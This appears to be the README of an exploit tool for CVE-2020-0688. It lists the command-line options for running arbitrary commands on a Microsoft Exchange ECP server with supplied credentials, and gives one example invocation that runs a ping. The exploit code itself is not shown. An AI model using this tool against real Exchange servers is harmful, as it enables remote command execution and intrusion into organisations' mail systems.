# cve-2020-0688
Usage:
```
usage: cve-2020-0688.py [-h] -s SERVER -u USER -p PASSWORD -c CMD

optional arguments:
  -h, --help            show this help message and exit
  -s SERVER, --server SERVER
                        ECP Server URL Example: http://ip/owa
  -u USER, --user USER  login account Example: domain\user
  -p PASSWORD, --password PASSWORD
                        Password
  -c CMD, --cmd CMD     Command u want to execute
```

example:
```
python cve-2020-0688.py -s https://ip/owa/ -u user -p pass -c "ping www.google.co.kr"
```
